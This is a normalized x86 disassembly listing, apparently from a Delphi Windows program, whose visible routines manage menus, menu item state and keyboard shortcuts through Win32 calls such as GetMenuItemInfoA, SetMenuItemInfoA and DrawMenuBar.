lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_40416c
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_4043cc
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_40422c
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_4461e8
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_446687
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_403f44
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_446648
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_445628
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_403f44
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44668e
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403ed0
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403ed0
lea eax [ ebp - 0x18 ]
call sub_403eac
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov eax ebx
call sub_44683c
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_445638
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4042b8
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_446004
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_445638
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_445638
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4030f0
mov eax [ ebp - 0x20 ]
call sub_4030f0
mov eax [ ebp - 0x14 ]
call sub_4030f0
mov eax [ ebp - 0xc ]
call sub_4030f0
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_446004
pop ecx
mov eax [ ebp - 0x30 ]
call sub_40416c
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_445638
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_4480e0
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407994
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_403f00
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40be98
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40be98
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_445638
push eax
mov edx esi
mov eax ebx
call sub_445638
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_4043cc
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407994
push ebp
mov eax [ ebp - 0x2c ]
call sub_445fd4
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_445fd4
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40be98
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_403f44
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_445638
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_445638
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_44804c
mov edx [ ebp - 0x40 ]
pop eax
call sub_403f00
mov edx esi
mov eax ebx
call sub_445638
push eax
mov edx esi
mov eax ebx
call sub_445638
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_40416c
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_4043cc
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_446088
mov eax [ ebp - 0x18 ]
call sub_40416c
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_40440c
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_404454
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_446088
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_4466e4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_445628
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_445628
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_446868
test al al
je r-xdata
mov eax esi
call sub_445628
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_445638
call sub_4466c0
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_445638
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_445638
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_445638
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_445638
call sub_4466c0
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_445638
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_445638
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_445638
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_445638
call sub_4466c0
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_44683c
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_44683c
and eax 0x7f
mov al [ eax + rw-data ]
sub_446868
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_446868
and eax 0x7f
mov al [ eax + rw-data ]
sub_446894
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44357c
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_419b0c
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_4475c0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_446930
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_4030f0
mov eax [ esi + 0x44 ]
call sub_4030f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419b58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_4469a4
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_4469a4
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_4430e8
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_445a2c
mov eax ebx
pop esi
pop ebx
retn
sub_4469e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_445628
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_445638
call sub_4469e4
pop ecx
test al al
je r-xdata
sub_446a7c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_4469e4
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_4430e8
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_446aac
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_446a7c
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_447dd0
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_446b1c
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_446a7c
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_446b38
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_446a7c
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_4461e8
mov ebx eax
xor edx edx
mov eax edi
call sub_4466e4
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_445b50
mov eax [ esi + 0x34 ]
call sub_445b50
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_443a8c
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_43a170
push eax
call DrawMenuBar
sub_446c24
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_446c24
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_446d49
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_446a7c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_445b50
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_446c14
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_446d78
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4226cc
xor eax eax
push ebp
push sub_446e76
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4226cc
xor eax eax
push ebp
push sub_446e4b
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_446c24
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4226c4
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446e7d
mov eax [ rw-data ]
call sub_4226c4
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_446a7c
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_446e9c
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_447220
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_447220
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_446f58
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_4474f4
mov eax ebx
call sub_40827c
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_446ff8
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_446f58
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_40411c
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_40436c
lea edx [ ebp - 0x200 ]
call sub_408340
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_44708c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_4470fc
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44759c
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44759c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_44759c
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_447108
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_446ff8
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_44708c
mov eax ebx
call sub_4475c0
jmp r-xdata
sub_447170
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_4471b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_4413e8
mov eax ebx
call sub_4469cc
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_44142c
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_419bdc
sub_4471f4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_419e28
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_4471b8
sub_447238
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_446a7c
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_446a7c
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_44a56c
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_447294
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_447369
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_446a7c
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_446a7c
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_445628
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_445638
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_404094
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
